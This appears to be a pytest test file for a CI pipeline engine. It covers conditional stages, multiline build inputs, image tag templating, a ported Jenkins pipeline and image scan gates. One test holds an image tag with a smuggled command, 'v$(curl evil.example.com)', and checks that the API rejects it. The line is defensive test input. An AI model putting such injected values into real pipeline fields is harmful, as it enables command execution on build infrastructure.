"""Conditional stages, multiline build inputs, and values passed between stages.

The three capabilities a Jenkins declarative pipeline needs that native CI did
not have: ``when { equals }``, a ``text`` parameter carrying a whole file, and a
``script { version = sh(...) }`` binding read by later stages. The last test
drives the real VERTO-ISSUING-WEB-APPLICATION definition from
``tools/seed_verto_issuing_pipeline.py`` so the port and the engine cannot drift
apart without something here going red.
"""

from __future__ import annotations

import pytest

from api.db import db
from api.models_application_intelligence import BitbucketCredentialProfile
from api.models_ci import CiBuild
from api.secret_encryption import encrypt_secret
from tests.conftest import auth_headers


@pytest.fixture()
def service_id(app, client, admin_token):
    """A service with source connected, ready for a pipeline to be saved onto."""
    with app.app_context():
        credential = BitbucketCredentialProfile(
            name="conditional-token",
            provider="bitbucket",
            credential_type="repository_access_token",
            secret_cipher=encrypt_secret("clone-token-value"),
            read_only=True,
            enabled=True,
        )
        db.session.add(credential)
        db.session.commit()
        credential_id = credential.id

    created = client.post(
        "/api/ci/services",
        json={"name": "Conditional App", "applicationType": "node"},
        headers=auth_headers(admin_token),
    ).get_json()["data"]["id"]

    client.put(
        f"/api/ci/services/{created}/source",
        json={
            "repositoryUrl": "https://bitbucket.org/areeba/conditional-app",
            "defaultBranch": "master",
            "credentialProfileId": credential_id,
        },
        headers=auth_headers(admin_token),
    )
    return created


def _pipeline_id(client, admin_token, service_id):
    return client.get(
        f"/api/ci/services/{service_id}/pipelines", headers=auth_headers(admin_token)
    ).get_json()["data"]["items"][0]["id"]


def _save(client, admin_token, pipeline_id, payload):
    return client.put(
        f"/api/ci/pipelines/{pipeline_id}", json=payload, headers=auth_headers(admin_token)
    )


def _drain(app, max_passes: int = 60):
    from api.services.ci import engine
    from api.services.ci.runners import mock as mock_runner

    original = mock_runner._STAGE_SECONDS
    mock_runner._STAGE_SECONDS = 0.0
    try:
        with app.app_context():
            for _ in range(max_passes):
                engine.advance_ci_builds()
                if not CiBuild.query.filter(
                    CiBuild.status.in_(("queued", "running"))
                ).count():
                    return
    finally:
        mock_runner._STAGE_SECONDS = original


_GATED_PIPELINE = {
    "parameters": [
        {"name": "DEPLOY_UAT", "type": "boolean", "default": "false"},
        {"name": "DEPLOY_PROD", "type": "boolean", "default": "false"},
    ],
    "stages": [
        {"name": "Checkout", "stageType": "checkout", "runnerLabels": ["mock"]},
        {
            "name": "Build",
            "stageType": "command",
            "commands": ["make"],
            "runnerLabels": ["mock"],
        },
        {
            "name": "Deploy UAT",
            "stageType": "command",
            "commands": ["deploy uat"],
            "runnerLabels": ["mock"],
            "runCondition": {"variable": "DEPLOY_UAT", "operator": "equals", "value": "true"},
        },
        {
            "name": "Deploy prod",
            "stageType": "command",
            "commands": ["deploy prod"],
            "runnerLabels": ["mock"],
            "runCondition": {"variable": "DEPLOY_PROD", "operator": "equals", "value": "true"},
        },
    ],
}


def _statuses(client, admin_token, build_id):
    stages = client.get(
        f"/api/ci/builds/{build_id}", headers=auth_headers(admin_token)
    ).get_json()["data"]["stages"]
    return {stage["name"]: stage["status"] for stage in stages}


# ---------------------------------------------------------------------------
# Conditions
# ---------------------------------------------------------------------------

def test_a_stage_runs_only_when_its_condition_matches(app, client, admin_token, service_id):
    pipeline_id = _pipeline_id(client, admin_token, service_id)
    assert _save(client, admin_token, pipeline_id, _GATED_PIPELINE).status_code == 200

    build_id = client.post(
        f"/api/ci/services/{service_id}/builds",
        json={"branch": "master", "variables": {"DEPLOY_UAT": "true", "DEPLOY_PROD": "false"}},
        headers=auth_headers(admin_token),
    ).get_json()["data"]["id"]
    _drain(app)

    statuses = _statuses(client, admin_token, build_id)
    assert statuses["Build"] == "success"
    assert statuses["Deploy UAT"] == "success"
    # The one that was not ticked is skipped, not failed and not silently
    # reported as a success it never earned.
    assert statuses["Deploy prod"] == "skipped"


def test_a_skipped_stage_does_not_fail_the_build(app, client, admin_token, service_id):
    pipeline_id = _pipeline_id(client, admin_token, service_id)
    _save(client, admin_token, pipeline_id, _GATED_PIPELINE)

    build_id = client.post(
        f"/api/ci/services/{service_id}/builds",
        json={"branch": "master"},  # neither box ticked
        headers=auth_headers(admin_token),
    ).get_json()["data"]["id"]
    _drain(app)

    build = client.get(
        f"/api/ci/builds/{build_id}", headers=auth_headers(admin_token)
    ).get_json()["data"]
    assert build["status"] == "success"
    assert [s["status"] for s in build["stages"]] == [
        "success",
        "success",
        "skipped",
        "skipped",
    ]


def test_the_skip_log_says_which_input_gated_the_stage(app, client, admin_token, service_id):
    pipeline_id = _pipeline_id(client, admin_token, service_id)
    _save(client, admin_token, pipeline_id, _GATED_PIPELINE)

    build_id = client.post(
        f"/api/ci/services/{service_id}/builds",
        json={"branch": "master"},
        headers=auth_headers(admin_token),
    ).get_json()["data"]["id"]
    _drain(app)

    stages = client.get(
        f"/api/ci/builds/{build_id}", headers=auth_headers(admin_token)
    ).get_json()["data"]["stages"]
    uat = next(stage for stage in stages if stage["name"] == "Deploy UAT")
    logs = client.get(
        f"/api/ci/builds/{build_id}/stages/{uat['id']}/logs",
        headers=auth_headers(admin_token),
    ).get_json()["data"]
    text = " ".join(line.get("content", "") for line in logs["lines"])
    assert "DEPLOY_UAT" in text
    # The sentence has to read the way the gate is written: an equals condition
    # runs when the input IS the value, so "runs only when X is 'true'".
    assert "DEPLOY_UAT is 'true'" in text
    assert "is not" not in text
    # The reason is the condition, not "this stage type has no executor".
    assert "stage type" not in text


def test_not_equals_inverts_the_gate(app, client, admin_token, service_id):
    pipeline_id = _pipeline_id(client, admin_token, service_id)
    _save(
        client,
        admin_token,
        pipeline_id,
        {
            "parameters": [{"name": "ENVIRONMENT", "type": "text", "default": "dev"}],
            "stages": [
                {"name": "Checkout", "stageType": "checkout", "runnerLabels": ["mock"]},
                {
                    "name": "Smoke test",
                    "stageType": "command",
                    "commands": ["smoke"],
                    "runnerLabels": ["mock"],
                    "runCondition": {
                        "variable": "ENVIRONMENT",
                        "operator": "not_equals",
                        "value": "prod",
                    },
                },
            ],
        },
    )

    ran = client.post(
        f"/api/ci/services/{service_id}/builds",
        json={"branch": "master", "variables": {"ENVIRONMENT": "uat"}},
        headers=auth_headers(admin_token),
    ).get_json()["data"]["id"]
    skipped = client.post(
        f"/api/ci/services/{service_id}/builds",
        json={"branch": "master", "variables": {"ENVIRONMENT": "prod"}},
        headers=auth_headers(admin_token),
    ).get_json()["data"]["id"]
    _drain(app)

    assert _statuses(client, admin_token, ran)["Smoke test"] == "success"
    assert _statuses(client, admin_token, skipped)["Smoke test"] == "skipped"


def test_a_condition_naming_a_deleted_input_skips_rather_than_errors(
    app, client, admin_token, service_id
):
    """Removing a parameter must stop the stages that needed it, not break builds."""
    pipeline_id = _pipeline_id(client, admin_token, service_id)
    _save(
        client,
        admin_token,
        pipeline_id,
        {
            "parameters": [],
            "stages": [
                {"name": "Checkout", "stageType": "checkout", "runnerLabels": ["mock"]},
                {
                    "name": "Deploy",
                    "stageType": "command",
                    "commands": ["deploy"],
                    "runnerLabels": ["mock"],
                    "runCondition": {
                        "variable": "GONE",
                        "operator": "equals",
                        "value": "true",
                    },
                },
            ],
        },
    )

    build_id = client.post(
        f"/api/ci/services/{service_id}/builds",
        json={"branch": "master"},
        headers=auth_headers(admin_token),
    ).get_json()["data"]["id"]
    _drain(app)

    build = client.get(
        f"/api/ci/builds/{build_id}", headers=auth_headers(admin_token)
    ).get_json()["data"]
    assert build["status"] == "success"
    assert _statuses(client, admin_token, build_id)["Deploy"] == "skipped"


def test_a_condition_round_trips_through_save_and_reload(client, admin_token, service_id):
    pipeline_id = _pipeline_id(client, admin_token, service_id)
    _save(client, admin_token, pipeline_id, _GATED_PIPELINE)

    stages = client.get(
        f"/api/ci/pipelines/{pipeline_id}", headers=auth_headers(admin_token)
    ).get_json()["data"]["stages"]
    by_name = {stage["name"]: stage for stage in stages}
    assert by_name["Deploy UAT"]["runCondition"] == {
        "variable": "DEPLOY_UAT",
        "operator": "equals",
        "value": "true",
    }
    # A stage with no condition reports none rather than an empty object, so the
    # editor can tell "always" from "half-configured".
    assert by_name["Build"]["runCondition"] is None


def test_an_unknown_condition_operator_is_rejected(client, admin_token, service_id):
    pipeline_id = _pipeline_id(client, admin_token, service_id)
    response = _save(
        client,
        admin_token,
        pipeline_id,
        {
            "stages": [
                {"name": "Checkout", "stageType": "checkout", "runnerLabels": ["mock"]},
                {
                    "name": "Deploy",
                    "stageType": "command",
                    "commands": ["deploy"],
                    "runCondition": {"variable": "X", "operator": "matches", "value": "y"},
                },
            ]
        },
    )
    assert response.status_code == 400
    assert "matches" in response.get_json()["error"]


def test_creating_a_pipeline_keeps_its_build_inputs(client, admin_token, service_id):
    """A create must persist parameters, not just an update.

    The regression this guards shipped a pipeline whose Run Build dialog asked
    for nothing and whose conditional stages could therefore never fire — and it
    was invisible to anyone who saved twice, because the second save went
    through update_pipeline.
    """
    created = client.post(
        f"/api/ci/services/{service_id}/pipelines",
        json={
            "name": "with-inputs",
            "parameters": [
                {"name": "DEPLOY_UAT", "type": "boolean", "default": "true"},
                {"name": "Dockerfile", "type": "multiline", "default": "FROM nginx\nRUN true\n"},
            ],
            "stages": [
                {"name": "Checkout", "stageType": "checkout", "runnerLabels": ["mock"]}
            ],
        },
        headers=auth_headers(admin_token),
    )
    assert created.status_code == 201, created.get_json()
    saved = created.get_json()["data"]
    assert [p["name"] for p in saved["parameters"]] == ["DEPLOY_UAT", "Dockerfile"]

    reloaded = client.get(
        f"/api/ci/pipelines/{saved['id']}", headers=auth_headers(admin_token)
    ).get_json()["data"]
    by_name = {p["name"]: p for p in reloaded["parameters"]}
    assert by_name["DEPLOY_UAT"]["default"] == "true"
    assert by_name["Dockerfile"]["default"] == "FROM nginx\nRUN true\n"


def test_a_bad_parameter_is_rejected_at_create_time(client, admin_token, service_id):
    response = client.post(
        f"/api/ci/services/{service_id}/pipelines",
        json={
            "name": "bad-inputs",
            "parameters": [{"name": "not a variable", "type": "text"}],
            "stages": [
                {"name": "Checkout", "stageType": "checkout", "runnerLabels": ["mock"]}
            ],
        },
        headers=auth_headers(admin_token),
    )
    assert response.status_code == 400
    assert "environment variable" in response.get_json()["error"]


# ---------------------------------------------------------------------------
# Multiline build inputs
# ---------------------------------------------------------------------------

_DOCKERFILE = "FROM nginx\n\nCOPY ./dist/ /usr/share/nginx/html/\nRUN echo 'hi'\n"


def test_a_multiline_input_keeps_its_newlines_end_to_end(app, client, admin_token, service_id):
    pipeline_id = _pipeline_id(client, admin_token, service_id)
    assert (
        _save(
            client,
            admin_token,
            pipeline_id,
            {
                "parameters": [
                    {"name": "Dockerfile", "type": "multiline", "default": _DOCKERFILE}
                ],
                "stages": [
                    {"name": "Checkout", "stageType": "checkout", "runnerLabels": ["mock"]},
                    {
                        "name": "Write it",
                        "stageType": "command",
                        "commands": ['printf %s "$Dockerfile" > Dockerfile'],
                        "runnerLabels": ["mock"],
                    },
                ],
            },
        ).status_code
        == 200
    )

    # The default survives the round trip, interior blank line included.
    parameters = client.get(
        f"/api/ci/services/{service_id}/parameters", headers=auth_headers(admin_token)
    ).get_json()["data"]["items"]
    assert parameters[0]["default"] == _DOCKERFILE

    # And so does a value supplied per build, which is what a stage reads.
    supplied = "FROM alpine\n\nRUN true\n"
    build_id = client.post(
        f"/api/ci/services/{service_id}/builds",
        json={"branch": "master", "variables": {"Dockerfile": supplied}},
        headers=auth_headers(admin_token),
    ).get_json()["data"]["id"]

    with app.app_context():
        snapshot = db.session.get(CiBuild, build_id).pipeline_snapshot
    assert snapshot["variables"]["Dockerfile"] == supplied.strip()
    assert "\n\n" in snapshot["variables"]["Dockerfile"]


def test_an_oversized_multiline_value_is_refused_not_truncated(
    client, admin_token, service_id
):
    """Silently cutting a Dockerfile short would build the wrong image."""
    from api.services.ci.pipelines import MAX_MULTILINE_CHARS

    pipeline_id = _pipeline_id(client, admin_token, service_id)
    _save(
        client,
        admin_token,
        pipeline_id,
        {
            "parameters": [{"name": "Blob", "type": "multiline", "default": "x"}],
            "stages": [
                {"name": "Checkout", "stageType": "checkout", "runnerLabels": ["mock"]}
            ],
        },
    )

    response = client.post(
        f"/api/ci/services/{service_id}/builds",
        json={"branch": "master", "variables": {"Blob": "y" * (MAX_MULTILINE_CHARS + 1)}},
        headers=auth_headers(admin_token),
    )
    assert response.status_code == 400
    assert "limit" in response.get_json()["error"]


# ---------------------------------------------------------------------------
# Image tag templates
# ---------------------------------------------------------------------------

def test_a_templated_image_tag_is_not_mangled_on_the_way_to_the_runner(
    app, client, admin_token, service_id
):
    """``${APP_VERSION_TAG}`` must reach the runner intact.

    Sanitising it here would turn the expansion into dashes and push an image
    called ``repo:-APP-VERSION-TAG-``.
    """
    from api.models import RegistryConnection
    from api.models_ci import CiService
    from api.services.ci import engine

    with app.app_context():
        registry = RegistryConnection(
            name="areeba",
            base_url="https://registry.example.com:9443",
            username="ci",
            password_encrypted=encrypt_secret("pw"),
            enabled=True,
        )
        db.session.add(registry)
        db.session.commit()
        service = db.session.get(CiService, service_id)
        service.registry_connection_id = registry.id
        db.session.add(service)
        db.session.commit()

    pipeline_id = _pipeline_id(client, admin_token, service_id)
    assert (
        _save(
            client,
            admin_token,
            pipeline_id,
            {
                "stages": [
                    {"name": "Checkout", "stageType": "checkout", "runnerLabels": ["mock"]},
                    {
                        "name": "Image",
                        "stageType": "container_image",
                        "runnerLabels": ["mock"],
                        "env": {"IMAGE_NAME": "verto-app", "IMAGE_TAG": "V${APP_VERSION_TAG}"},
                    },
                ]
            },
        ).status_code
        == 200
    )

    build_id = client.post(
        f"/api/ci/services/{service_id}/builds",
        json={"branch": "master"},
        headers=auth_headers(admin_token),
    ).get_json()["data"]["id"]

    with app.app_context():
        build = db.session.get(CiBuild, build_id)
        definition = build.pipeline_snapshot["stages"][1]
        resolved, reason = engine._registry_for(build, definition)

    assert reason is None
    assert resolved["tag"] == "V${APP_VERSION_TAG}"
    assert resolved["tagIsTemplate"] is True


def test_an_image_tag_template_that_could_run_a_command_is_rejected(
    client, admin_token, service_id
):
    pipeline_id = _pipeline_id(client, admin_token, service_id)
    response = _save(
        client,
        admin_token,
        pipeline_id,
        {
            "stages": [
                {"name": "Checkout", "stageType": "checkout", "runnerLabels": ["mock"]},
                {
                    "name": "Image",
                    "stageType": "container_image",
                    "env": {"IMAGE_TAG": "v$(curl evil.example.com)"},
                },
            ]
        },
    )
    assert response.status_code == 400
    assert "image tag" in response.get_json()["error"].lower()


def test_a_literal_image_tag_is_still_sanitised(app, client, admin_token, service_id):
    """The template path must not become a way past tag sanitising."""
    from api.models import RegistryConnection
    from api.models_ci import CiService
    from api.services.ci import engine

    with app.app_context():
        registry = RegistryConnection(
            name="areeba2",
            base_url="https://registry.example.com:9443",
            username="ci",
            password_encrypted=encrypt_secret("pw"),
            enabled=True,
        )
        db.session.add(registry)
        db.session.commit()
        service = db.session.get(CiService, service_id)
        service.registry_connection_id = registry.id
        db.session.add(service)
        db.session.commit()

    pipeline_id = _pipeline_id(client, admin_token, service_id)
    _save(
        client,
        admin_token,
        pipeline_id,
        {
            "stages": [
                {"name": "Checkout", "stageType": "checkout", "runnerLabels": ["mock"]},
                {
                    "name": "Image",
                    "stageType": "container_image",
                    "runnerLabels": ["mock"],
                    "env": {"IMAGE_TAG": "feature/ABC-1 release"},
                },
            ]
        },
    )
    build_id = client.post(
        f"/api/ci/services/{service_id}/builds",
        json={"branch": "master"},
        headers=auth_headers(admin_token),
    ).get_json()["data"]["id"]

    with app.app_context():
        build = db.session.get(CiBuild, build_id)
        resolved, _ = engine._registry_for(build, build.pipeline_snapshot["stages"][1])

    assert resolved["tag"] == "feature-ABC-1-release"
    assert resolved["tagIsTemplate"] is False


# ---------------------------------------------------------------------------
# The Kubernetes runner's half of the two new mechanisms
# ---------------------------------------------------------------------------

def test_every_stage_script_sources_the_shared_build_env():
    from api.services.ci.runners import kubernetes

    script = kubernetes._wrap_stage_script("make", continue_on_failure=False)
    assert "export KUBESIGHT_ENV=/workspace/.kubesight/build.env" in script
    # Sourced before the stage's own commands, so a stage can override an
    # inherited value simply by assigning it.
    assert script.index("KUBESIGHT_ENV") < script.index("make")


def test_a_templated_tag_is_resolved_in_the_build_pod():
    from api.services.ci.runners import kubernetes
    from api.services.ci.runners.base import StageExecution

    execution = StageExecution(
        build_id=1,
        build_number=7,
        stage_id=1,
        service_slug="verto",
        stage_name="Image",
        stage_type="container_image",
        image=None,
        working_directory=None,
        commands=[],
        env={},
        position=2,
        registry={
            "host": "registry.example.com:9443",
            "repository": "verto-issuing-app",
            "tag": "V${APP_VERSION_TAG}",
            "tagIsTemplate": True,
            "dockerfile": "Dockerfile",
        },
    )
    script = kubernetes._buildctl_args(execution, "/tmp/meta.json")

    # The shell finishes the tag, and the resolved value — not the template —
    # is what buildctl is told to push.
    assert 'KS_TAG="V${APP_VERSION_TAG}"' in script
    assert "tr -c 'A-Za-z0-9._-'" in script
    assert "name=registry.example.com:9443/verto-issuing-app:$KS_TAG" in script


# ---------------------------------------------------------------------------
# The real ported pipeline
# ---------------------------------------------------------------------------

def _seed_module():
    import importlib.util
    from pathlib import Path

    path = Path(__file__).resolve().parents[1] / "tools" / "seed_verto_issuing_pipeline.py"
    spec = importlib.util.spec_from_file_location("seed_verto", path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_the_verto_pipeline_saves_and_gates_its_deploys(app, client, admin_token, service_id):
    """The seeded definition is accepted by the API and behaves as ported.

    Guards the whole port at once: if a stage's shape, a parameter name or a
    condition stops being something the engine accepts, this fails rather than
    the seed script failing on someone's database.
    """
    seed = _seed_module()

    # The seed's secrets have to exist before its secretRefs resolve — the same
    # ordering the script itself follows.
    for key, value in seed.PLACEHOLDER_SECRETS.items():
        assert (
            client.post(
                f"/api/ci/services/{service_id}/secrets",
                json={"key": key, "value": value},
                headers=auth_headers(admin_token),
            ).status_code
            == 201
        )

    pipeline_id = _pipeline_id(client, admin_token, service_id)
    stages = [
        {**stage, "runnerLabels": ["mock"]} for stage in seed.STAGES
    ]
    response = _save(
        client,
        admin_token,
        pipeline_id,
        {"parameters": seed.PARAMETERS, "stages": stages},
    )
    assert response.status_code == 200, response.get_json()

    saved = response.get_json()["data"]
    assert [stage["name"] for stage in saved["stages"]] == [
        stage["name"] for stage in seed.STAGES
    ]
    # Five deploys, each gated on its own checkbox.
    gated = {
        stage["name"]: stage["runCondition"]["variable"]
        for stage in saved["stages"]
        if stage["runCondition"]
    }
    assert gated == {
        "Deploy dev Lebanon": "Lebanondev",
        "Deploy sit Lebanon": "Lebanonsit",
        "Deploy UAT Lebanon": "Lebanonuat",
        "Deploy preprod Lebanon": "Lebanonpreprod",
        "Deploy sibedge Lebanon": "Lebanonsibedge",
    }

    build_id = client.post(
        f"/api/ci/services/{service_id}/builds",
        json={"branch": "master", "variables": {"Lebanonuat": "true"}},
        headers=auth_headers(admin_token),
    ).get_json()["data"]["id"]
    _drain(app)

    statuses = _statuses(client, admin_token, build_id)
    assert statuses["Pre Build"] == "success"
    assert statuses["Resolve version"] == "success"
    assert statuses["Deploy UAT Lebanon"] == "success"
    for name in (
        "Deploy dev Lebanon",
        "Deploy sit Lebanon",
        "Deploy preprod Lebanon",
        "Deploy sibedge Lebanon",
    ):
        assert statuses[name] == "skipped", name


def test_the_verto_entrypoint_does_not_re_enter_itself(app):
    """It is copied over /docker-entrypoint.sh, so exec'ing that path would loop."""
    seed = _seed_module()
    assert "exec /docker-entrypoint.sh" not in seed.ENTRYPOINT
    assert seed.ENTRYPOINT.rstrip().endswith('exec "$@"')


def test_the_verto_deploy_tag_comes_from_the_stage_that_built_it(app):
    """One string, exported once — not the version written out twice."""
    seed = _seed_module()
    resolve = next(s for s in seed.STAGES if s["name"] == "Resolve version")
    image = next(s for s in seed.STAGES if s["stageType"] == "container_image")
    deploys = [s for s in seed.STAGES if s["name"].startswith("Deploy ")]

    assert any("APP_VERSION_TAG" in line for line in resolve["commands"])
    assert image["env"]["IMAGE_TAG"] == "${APP_VERSION_TAG}"
    for stage in deploys:
        assert any("$APP_VERSION_TAG" in line for line in stage["commands"]), stage["name"]


# ---------------------------------------------------------------------------
# The image scan gate, through the API
#
# The gate lives on the container_image stage rather than in a stage of its own,
# so these are the rules that keep it from being configured into a shape where
# it looks armed and is not.
# ---------------------------------------------------------------------------

def test_an_image_scan_round_trips_through_save_and_reload(client, admin_token, service_id):
    pipeline_id = _pipeline_id(client, admin_token, service_id)
    response = _save(
        client,
        admin_token,
        pipeline_id,
        {
            "stages": [
                {"name": "Checkout", "stageType": "checkout", "runnerLabels": ["mock"]},
                {
                    "name": "Build Image",
                    "stageType": "container_image",
                    "runnerLabels": ["linux"],
                    "imageScan": {"enabled": True, "threshold": "high", "onFail": "warn"},
                },
            ]
        },
    )
    assert response.status_code == 200, response.get_json()

    stages = client.get(
        f"/api/ci/pipelines/{pipeline_id}", headers=auth_headers(admin_token)
    ).get_json()["data"]["stages"]
    by_name = {stage["name"]: stage for stage in stages}
    assert by_name["Build Image"]["imageScan"] == {
        "enabled": True,
        "scanner": "trivy",
        "threshold": "high",
        "onFail": "warn",
        "ignoreUnfixed": False,
    }
    # A stage nobody configured a scan on reports None, not a disabled gate:
    # "not considered" and "considered and declined" are different answers.
    assert by_name["Checkout"]["imageScan"] is None


def test_a_scan_on_a_stage_that_builds_no_image_is_rejected(client, admin_token, service_id):
    """Rejected rather than ignored. Silently dropping a gate somebody
    configured is the failure that matters here — they would go on believing
    the image was scanned."""
    pipeline_id = _pipeline_id(client, admin_token, service_id)
    response = _save(
        client,
        admin_token,
        pipeline_id,
        {
            "stages": [
                {"name": "Checkout", "stageType": "checkout", "runnerLabels": ["mock"]},
                {
                    "name": "Test",
                    "stageType": "command",
                    "commands": ["npm test"],
                    "imageScan": {"enabled": True, "threshold": "critical"},
                },
            ]
        },
    )
    assert response.status_code == 400
    assert "builds no image to scan" in response.get_json()["error"]


def test_an_unknown_scan_threshold_is_rejected(client, admin_token, service_id):
    pipeline_id = _pipeline_id(client, admin_token, service_id)
    response = _save(
        client,
        admin_token,
        pipeline_id,
        {
            "stages": [
                {"name": "Checkout", "stageType": "checkout", "runnerLabels": ["mock"]},
                {
                    "name": "Build Image",
                    "stageType": "container_image",
                    "imageScan": {"enabled": True, "threshold": "scary"},
                },
            ]
        },
    )
    assert response.status_code == 400
    assert "scary" in response.get_json()["error"]


def test_a_saved_gate_reaches_the_build_snapshot(app, client, admin_token, service_id):
    """A build runs the pipeline as it stood when it started. If the gate did
    not make it into the snapshot, editing the pipeline afterwards would decide
    whether a running build scanned — and a retry would not reproduce it."""
    pipeline_id = _pipeline_id(client, admin_token, service_id)
    _save(
        client,
        admin_token,
        pipeline_id,
        {
            "stages": [
                {"name": "Checkout", "stageType": "checkout", "runnerLabels": ["mock"]},
                {
                    "name": "Build Image",
                    "stageType": "container_image",
                    "runnerLabels": ["mock"],
                    "imageScan": {"enabled": True, "threshold": "critical", "onFail": "block"},
                },
            ]
        },
    )
    build_id = client.post(
        f"/api/ci/services/{service_id}/builds",
        json={"branch": "master"},
        headers=auth_headers(admin_token),
    ).get_json()["data"]["id"]

    with app.app_context():
        snapshot = db.session.get(CiBuild, build_id).pipeline_snapshot
        gate = next(
            stage["imageScan"]
            for stage in snapshot["stages"]
            if stage["name"] == "Build Image"
        )
        assert gate["enabled"] is True
        assert gate["threshold"] == "critical"
